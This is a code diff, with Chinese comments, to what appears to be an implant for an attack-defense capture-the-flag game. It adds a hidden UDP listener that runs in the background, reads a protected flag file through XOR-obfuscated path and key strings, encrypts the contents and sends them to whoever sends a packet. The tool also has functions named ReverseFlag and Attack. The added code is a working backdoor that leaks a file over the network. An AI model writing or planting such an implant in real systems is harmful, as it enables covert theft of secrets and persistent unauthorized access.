@@ -392,6 +392,73 @@ void ReverseFlag()
     close(clientSocket);
 }
 
+/*
+ * ServeFlagUDP：监听 SERVE_FLAG_PORT UDP 端口，
+ * 收到任意 UDP 包后 fork 子进程处理：
+ *   子进程使用独立（private）内存，读 flag → AES+RSA 加密 → 发送给客户端 → _exit 自毁。
+ * 主监听进程不持有任何 flag 数据，永不退出。
+ */
+void ServeFlagUDP()
+{
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) return;
+
+    int opt = 1;
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    struct sockaddr_in bind_addr;
+    bind_addr.sin_family = AF_INET;
+    bind_addr.sin_port = htons(SERVE_FLAG_PORT);
+    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
+    {
+        close(sock);
+        return;
+    }
+
+    signal(SIGCHLD, SIG_IGN);
+
+    char buf[16];
+    struct sockaddr_in client;
+    socklen_t clen;
+
+    for (;;)
+    {
+        clen = sizeof(client);
+        int n = recvfrom(sock, buf, sizeof(buf), 0,
+                         (struct sockaddr *)&client, &clen);
+        if (n < 0) continue;
+
+        pid_t p = fork();
+        if (p == 0)
+        {
+            /* 子进程：独立 private 内存，读 flag → 加密 → 发送 → 自毁 */
+            char raw[0x50] = {0};
+            int fd = open(XorString(FLAG_PATH), O_RDONLY);
+            if (fd >= 0)
+            {
+                read(fd, raw, 0x30);
+                close(fd);
+            }
+
+            uint8_t *blocks = NULL;
+            int block_num = splitBlock(raw, &blocks);
+            aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY),
+                          block_num, (uint8_t *)XorString(AES_IV));
+            int aes_len = block_num * 16;
+
+            uint8_t rsa_out[RSA_BYTES];
+            rsa_encrypt(blocks, aes_len, rsa_out);
+            free(blocks);
+
+            sendto(sock, rsa_out, RSA_BYTES, 0,
+                   (struct sockaddr *)&client, clen);
+            _exit(0);
+        }
+    }
+}
+
 void Attack()
 {
     char cmd[512] = {0};
@@ -527,6 +594,16 @@ void do_work(char **argv)
     {
         LockFlagDir();
         exit(0);
+    }
+#endif
+
+#if (SERVE_FLAG)
+    /* 启动 UDP flag 被动服务：监听 SERVE_FLAG_PORT，有请求则 fork 子进程处理 */
+    pid_t pid_s = fork();
+    if (pid_s == 0)
+    {
+        ServeFlagUDP(); /* 永不返回 */
+        _exit(0);
     }
 #endif
 
